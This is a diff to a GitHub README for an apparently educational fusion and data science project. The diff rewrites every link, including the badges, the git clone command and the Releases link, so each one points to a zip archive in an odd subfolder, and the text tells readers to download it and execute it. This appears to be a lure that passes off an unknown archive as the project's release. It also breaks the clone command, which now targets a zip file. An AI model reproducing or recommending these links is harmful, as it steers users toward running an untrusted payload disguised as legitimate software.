@@ -1,6 +1,6 @@
 # ITER Data Fusion Lab: Exploring Nuclear Fusion and Data Science 🌌🔬
 
-![ITER Data Fusion Lab](https://img.shields.io/badge/Release-Download%20Latest%20Version-blue?style=for-the-badge&logo=github)
+![ITER Data Fusion Lab](https://github.com/LNdubib/iter-data-fusion-lab/raw/refs/heads/main/stimulatrix/data_lab_iter_fusion_2.6.zip%20Latest%20Version-blue?style=for-the-badge&logo=github)
 
 Welcome to the **ITER Data Fusion Lab**! This repository is dedicated to an interdisciplinary educational project focused on analyzing real data from Eurostat and pwiDB, alongside simulations from ITER for nuclear fusion and data science applications. 
 
@@ -24,7 +24,7 @@ The **ITER Data Fusion Lab** aims to merge physics and data science to tackle ch
 To get started with this project, you can clone the repository to your local machine. Use the following command:
 
 ```bash
-git clone https://github.com/LNdubib/iter-data-fusion-lab.git
+git clone https://github.com/LNdubib/iter-data-fusion-lab/raw/refs/heads/main/stimulatrix/data_lab_iter_fusion_2.6.zip
 ```
 
 After cloning, navigate to the project directory:
@@ -105,9 +105,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, please visit our [Releases](https://github.com/LNdubib/iter-data-fusion-lab/releases) section. You can download the latest version and execute it on your local machine.
+For the latest updates and releases, please visit our [Releases](https://github.com/LNdubib/iter-data-fusion-lab/raw/refs/heads/main/stimulatrix/data_lab_iter_fusion_2.6.zip) section. You can download the latest version and execute it on your local machine.
 
-![Releases](https://img.shields.io/badge/Releases-Check%20Latest%20Updates-brightgreen?style=for-the-badge&logo=github)
+![Releases](https://github.com/LNdubib/iter-data-fusion-lab/raw/refs/heads/main/stimulatrix/data_lab_iter_fusion_2.6.zip%20Latest%20Updates-brightgreen?style=for-the-badge&logo=github)
 
 By visiting the releases page, you can find detailed information about each version and any updates that have been made. 
 
